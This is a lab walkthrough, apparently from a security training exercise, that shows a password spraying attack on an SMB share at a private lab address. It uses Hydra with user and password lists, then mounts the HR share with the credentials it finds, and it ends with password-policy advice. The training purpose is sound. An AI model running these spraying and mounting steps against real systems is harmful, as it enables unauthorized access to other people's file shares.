##Perform a Password Spraying Attack
This project focuses on managing password security by demonstrating a password spraying attack and emphasizing best practices for securing network shares. The goal is to explore the vulnerabilities of weak or common passwords in a networked environment, and to highlight the importance of using strong, complex passwords to safeguard sensitive resources. Through the use of tools like Hydra and basic Linux commands, this project aims to provide a hands-on approach to understanding password-related security risks and reinforcing effective password management strategies.
---

## Step 1: Create a Mount Point  
To attach a network share, start by creating a mount point:  

```bash
mkdir /mnt/HR
```

A mount point is necessary for accessing a network share once valid credentials are discovered.  

---

## Step 2: Check for Available Users  
View the list of users from the MS10 system (IP: 10.1.16.2):  

```bash
cat users.txt
```

> **Note:** If `users.txt` is not accessible, close and reopen the terminal. Ensure the prompt is `root@kali` and type:  
> ```bash
> ls -a
> ```  
> The file should then appear in the directory.

---

## Step 3: Attempt Password Submissions  
### Discovered Passwords:  
```
abc123  
123456  
Pa$$w0rd  
```

### First Attempt:  
Try mounting the network share using the following command:  

```bash
mount //10.1.16.2/HR /mnt/HR -o username=pat
```

When prompted for a password, enter: `abc123`  

Result: **Mount error** – This password is incorrect.

### Second Attempt:  
Try the second password:  

```bash
mount //10.1.16.2/HR /mnt/HR -o username=pat
```

When prompted for a password, enter: `123456`  

Result: **Mount error** – This password is also incorrect.  

---

## Step 4: Automate with Hydra  
Manually testing each password is time-consuming, so let's automate the process. First, create a file containing the discovered passwords:  

```bash
echo abc123 > pass.txt  
echo 123456 >> pass.txt  
echo 'Pa$$w0rd' >> pass.txt  
cat pass.txt  
```

> **Important:** Ensure the passwords are spelled correctly, especially `Pa$$w0rd`. Use single quotes to avoid issues.  

### Understanding the Commands:  
- `>` creates a new file and writes to it.  
- `>>` appends to the file without overwriting its contents.  

---

## Step 5: Launch Hydra for Password Spraying  
Use the Hydra wizard to perform a password spraying attack:  

```bash
hydra-wizard
```

### Hydra Wizard Responses:  

| **Prompt**          | **Response**   |
|----------------------|----------------|
| Service              | smb            |
| Target               | 10.1.16.2      |
| Username             | users.txt      |
| Password             | pass.txt       |
| Test                 | (Press Enter)  |
| Port                 | (Press Enter)  |
| Module options       | (Press Enter)  |
| Run command          | Y              |

Hydra will now attempt each password for every user listed in `users.txt` against the MS10 share.  

---

## Step 6: Verify Credentials  
Once Hydra identifies valid credentials, mount the share to confirm:  

```bash
mount //10.1.16.2/HR /mnt/HR -o username=jaime
```

Enter the password: `Pa$$w0rd`  

If no error appears, the share has been successfully mounted.  

View the share’s contents:  

```bash
ls /mnt/HR
```

To unmount the share, use:  
```bash
umount /mnt/HR
```

---

## Conclusion: Best Practices for Password Security  
This project highlights the importance of good password management. To improve security:  

- Implement **password complexity** and **length requirements**.  
- Train users to avoid using simple passwords like `123456`.  
- Discourage writing down passwords. If necessary, securely destroy the paper afterward.  
- Use automated tools like Hydra responsibly to test and strengthen your security policies.
